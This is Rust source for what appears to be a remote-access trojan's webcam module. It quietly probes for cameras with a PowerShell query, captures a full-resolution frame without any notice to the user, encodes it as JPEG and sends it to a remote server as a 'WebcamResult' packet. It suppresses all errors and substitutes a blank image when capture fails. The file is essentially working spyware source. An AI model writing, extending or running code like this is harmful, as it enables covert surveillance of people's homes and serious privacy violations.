use crate::handler::send_packet;
use common::packets::ServerboundPacket;
use tokio::task;
use std::{panic::{self, AssertUnwindSafe}, process::Command, thread};
use image::{ImageOutputFormat, RgbImage};
use std::io::Cursor;

pub async fn take_webcam() {
    task::spawn_blocking(move || {
        let handle = thread::spawn(|| {
            safe_webcam_capture()
        });
     
        match handle.join() {
            Ok(Some(data)) => {
                tokio::spawn(async move {
                    if let Err(_) = send_packet(ServerboundPacket::WebcamResult(data)).await {}
                });
            }
            _ => {
                let white_image = create_blank_image(640, 480);
                tokio::spawn(async move {
                    if let Err(_) = send_packet(ServerboundPacket::WebcamResult(white_image)).await {}
                });
            }
        }
    });
}

fn safe_webcam_capture() -> Option<Vec<u8>> {
    attempt_nokhwa_capture()
}

fn attempt_nokhwa_capture() -> Option<Vec<u8>> {
    use nokhwa::{Camera, utils::{CameraIndex, RequestedFormat, RequestedFormatType}};
    use nokhwa::pixel_format::RgbFormat;
    if !has_webcam() {
        return None;
    }
 
    let camera_index = CameraIndex::Index(0);
    let requested_format = RequestedFormat::new::<RgbFormat>(RequestedFormatType::AbsoluteHighestResolution);
 
    let camera_result = panic::catch_unwind(AssertUnwindSafe(|| {
        Camera::new(camera_index, requested_format)
    }));
 
    let mut camera = match camera_result {
        Ok(Ok(cam)) => cam,
        _ => return None
    };
 
    if let Err(_) = camera.open_stream() {
        return None;
    }
 
    let frame = match camera.frame() {
        Ok(f) => f,
        Err(_) => {
            let _ = camera.stop_stream();
            return None;
        }
    };
 
    let _ = camera.stop_stream();

    let res = camera.resolution();
    let width = res.width();
    let height = res.height();
    let buffer = frame.buffer();

    // If the buffer size matches YUYV (2 bytes per pixel) instead of RGB (3 bytes)
    // we need to convert it.
    let rgb_data = if buffer.len() == (width * height * 2) as usize {
        yuyv_to_rgb(buffer, width, height)
    } else if buffer.len() == (width * height * 3) as usize {
        buffer.to_vec()
    } else {
        // Fallback or attempt to use whatever nokhwa gave us
        buffer.to_vec()
    };

    if rgb_data.len() != (width * height * 3) as usize {
        return None;
    }

    let img = RgbImage::from_raw(width, height, rgb_data)?;
    let mut jpeg_bytes = Cursor::new(Vec::with_capacity(1024 * 100));
    if img.write_to(&mut jpeg_bytes, ImageOutputFormat::Jpeg(80)).is_err() {
        return None;
    }

    Some(jpeg_bytes.into_inner())
}

fn yuyv_to_rgb(yuyv: &[u8], width: u32, height: u32) -> Vec<u8> {
    let mut rgb = Vec::with_capacity((width * height * 3) as usize);
    for chunk in yuyv.chunks_exact(4) {
        let y0 = chunk[0] as f32;
        let u  = chunk[1] as f32 - 128.0;
        let y1 = chunk[2] as f32;
        let v  = chunk[3] as f32 - 128.0;

        // Pixel 1
        rgb.push((y0 + 1.402 * v).clamp(0.0, 255.0) as u8); // R
        rgb.push((y0 - 0.344136 * u - 0.714136 * v).clamp(0.0, 255.0) as u8); // G
        rgb.push((y0 + 1.772 * u).clamp(0.0, 255.0) as u8); // B

        // Pixel 2
        rgb.push((y1 + 1.402 * v).clamp(0.0, 255.0) as u8); // R
        rgb.push((y1 - 0.344136 * u - 0.714136 * v).clamp(0.0, 255.0) as u8); // G
        rgb.push((y1 + 1.772 * u).clamp(0.0, 255.0) as u8); // B
    }
    rgb
}

fn has_webcam() -> bool {
    let devices_output = Command::new("powershell")
        .args(&["-Command", "Get-PnpDevice -Class Camera -Status OK | Measure-Object | Select-Object -ExpandProperty Count"])
        .output();
     
    match devices_output {
        Ok(output) => {
            if let Ok(count_str) = String::from_utf8(output.stdout) {
                if let Ok(count) = count_str.trim().parse::<i32>() {
                    return count > 0;
                }
            }
        }
        Err(_) => {}
    }

    false
}

fn create_blank_image(width: u32, height: u32) -> Vec<u8> {
    let mut img = RgbImage::new(width, height);
    for pixel in img.pixels_mut() {
        *pixel = image::Rgb([255, 255, 255]);
    }

    let mut jpeg_bytes = Cursor::new(Vec::with_capacity(64 * 1024));
    let _ = img.write_to(&mut jpeg_bytes, ImageOutputFormat::Jpeg(80)).ok();
    jpeg_bytes.into_inner()
}